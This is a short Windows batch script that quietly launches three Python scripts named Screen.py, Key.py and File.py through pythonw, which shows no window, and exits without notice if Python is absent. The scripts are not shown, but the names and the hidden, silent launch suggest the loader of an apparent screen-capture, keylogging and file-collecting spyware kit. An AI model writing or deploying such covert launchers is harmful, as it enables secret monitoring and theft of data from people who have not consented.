@echo off
setlocal


set USERDIR=%~dp0

where pythonw >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
)

start "" pythonw "%USERDIR%\Screen.py"
timeout /t 2 >nul

start "" pythonw "%USERDIR%\Key.py"
timeout /t 2 >nul

start "" pythonw "%USERDIR%\File.py"

exit